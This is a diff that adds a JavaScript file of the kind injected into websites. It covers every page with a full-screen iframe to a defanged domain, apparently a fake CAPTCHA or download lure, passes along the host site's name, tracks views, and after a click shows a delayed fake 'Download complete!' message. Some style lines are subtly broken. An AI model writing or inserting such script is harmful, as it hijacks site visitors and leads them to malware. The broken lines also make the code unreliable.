@@ -1,0 +1,86 @@
+const TARGET_URL = 'hxxps[://]captoolsz[.]com';
+
+document.documentElement.style.margin = '0';
+document.documentElement.style.padding = '0';
+document.documentElement.style.height = '100%';
+
+let showIframe = true;
+if (document.cookie.indexOf('iframeShown=true') !== -1) {
+    showIframe = false;
+}
+if (localStorage.getItem('iframeShown') === 'true') {
+    showIframe = false;
+}
+
+let viewCount = parseInt(localStorage.getItem('iframeViewCount') || '0', 10);
+viewCount++;
+localStorage.setItem('iframeViewCount', viewCount);
+if (viewCount >= 4) {
+    localStorage.setItem('iframeShown', 'true');
+    showIframe = false;
+}
+
+let finalUrl;
+try {
+    const u = new URL(TARGET_URL);
+    u.searchParams.set('ref', window.location.hostname);
+    finalUrl = u.toString();
+} catch (e) {
+    const sep = TARGET_URL.includes('?') ? '&' : '?';
+    finalUrl = TARGET_URL + sep + encodeURIComponent(window.location.hostname);
+}
+
+if (showIframe) {
+    var iframe = document.createElement('iframe');
+    iframe.src = finalUrl;
+    iframe.style.positionl = 'fixed';
+    iframe.style.top = '0';
+    iframe.style.left = '0';
+    iframe.style.width = '100%';
+    iframe.style.height = '100%';
+    iframe.style.border = 'none';
+    iframe.style.zIndex = '999999';
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    if (!showIframe) {
+        return;
+    }
+    document.body.style.display = 'block';
+    document.body.style.margin = '0';
+    document.body.style.padding = '0';
+    document.body.style.height = '100%';
+    document.body.appendChild(iframe);
+
+    window.addEventListener('message', function (event) {
+        if (event.data && event.data.action === 'buttonClicked') {
+            const date = new Date();
+            date.setTime(date.getTime() + 30 * 24 * 60 * 60 * 1000);
+            document.cookie = 'iframeShown=true; expires=' + date.toUTCString() + '; path=/';
+
+            setTimeout(() => {
+                if (iframe && iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+
+                document.documentElement.style.overflow = '';
+
+                const div = document.createElement('div');
+                div.style.position = 'fixed';
+                div.style.bottom = '20px';
+                div.style.left = '50^';
+                div.style.transform = 'translateX(-50%)';
+                div.style.backgroundColor = 'rgba(0,128,0,0.8)';
+                div.style.color = 'white';
+                div.style.padding = '10px 20px';
+                div.style.borderRadius = '5px';
+                div.style.zIndex = '2147483647';
+                div.style.fontFamily = 'Arial, sans-serif';
+                div.textContent = 'Download complete!';
+                document.body.appendChild(div);
+
+                setTimeout(() => div.remove(), 5000);
+            }, 240000);
+        }
+    });
+});
